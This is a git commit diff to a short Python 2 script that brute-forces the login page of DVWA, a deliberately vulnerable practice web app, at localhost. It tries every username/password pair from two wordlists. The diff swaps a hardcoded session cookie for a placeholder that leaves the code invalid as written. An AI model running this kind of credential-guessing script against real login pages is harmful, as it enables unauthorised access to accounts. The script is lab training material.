ecb4a5c52c16f1979a3981fdcc0de67e324cc25f
kali-ren <renan@insert.uece.br>
2016-12-24 17:26:34 -0300

    fixed

--- bf_http.py
+++ bf_http.py
@@ -1,16 +1,19 @@
 #!/usr/bin/python
 import requests,sys,urllib
-
+#dvwa brute-force
 
 if len(sys.argv) != 3:
-	print 'usage: bf_http lista_users lista_password'
+	print 'usage: bf_http user_list password_list'
 	exit(0)
-header = {'Cookie':'security=low; PHPSESSID=5i848gij0u9o6fabaab3eohpr3'}
+
+header = {YOUR_COOKIE}
 a = sys.argv[1]
 b = sys.argv[2]
 users = open(a,'r')
 pas = open(b,'r')
+find = False
 print 'running...'
+
 for i in users.readlines():
 	i = i.strip('\n')
 	for j in pas.readlines():
@@ -18,9 +21,13 @@ for i in users.readlines():
 		ip = 'http://localhost/DVWA-master/vulnerabilities/brute/?username='+i+'&password='+urllib.quote(j)+'&Login=Login#'
 		r = requests.get(ip,headers=header).content
  		if not 'Username and/or password incorrect.' in r:
-			print '[+] user/password found'
-			print 'user: ',i+'\n'+'password: '+j
-			exit(0)
+			print '[+] user/password found %s:%s'%(i,j)
+			users.seek(0)
+			pas.seek(0)
+			find = True
+			break
+
+if not find:
 	print '[-] user/password not found'
 
 
